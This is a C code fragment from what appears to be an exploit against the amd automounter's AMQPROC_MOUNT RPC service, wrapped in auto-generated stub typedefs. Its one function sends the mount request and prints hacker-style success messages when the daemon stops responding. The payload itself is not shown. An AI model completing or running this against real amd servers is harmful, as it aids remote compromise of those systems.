
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int voidp ;
struct timeval {int member_0; int member_1; } ;
typedef int res ;
typedef int caddr_t ;
typedef int XDRPROC_T_TYPE ;
typedef int CLIENT ;


 int AMQPROC_MOUNT ;
 scalar_t__ RPC_SUCCESS ;
 scalar_t__ clnt_call (int *,int ,int ,int ,int ,int ,struct timeval) ;
 int clnt_perror (int *,char*) ;
 int memset (char*,int ,int) ;
 int printf (char*) ;
 scalar_t__ xdr_amq_string ;
 scalar_t__ xdr_int ;

int *
amqproc_mount_1(voidp argp, CLIENT *clnt)
{
  static int res;
  struct timeval TIMEOUT = {10, 0};

  memset((char *) &res, 0, sizeof(res));
  if (clnt_call(clnt, AMQPROC_MOUNT, (XDRPROC_T_TYPE) xdr_amq_string, argp,
                (XDRPROC_T_TYPE) xdr_int, (caddr_t) & res,
                TIMEOUT) != RPC_SUCCESS) {
    printf ( "voce e' um hax0r!\n");
    printf ( "don't forget to restart amd: /etc/rc.d/init.d/amd start\n");
    clnt_perror ( clnt, "clnt_call");
    return (((void*)0));
  }
  printf ( "exploit failed\n");
  return (&res);
}
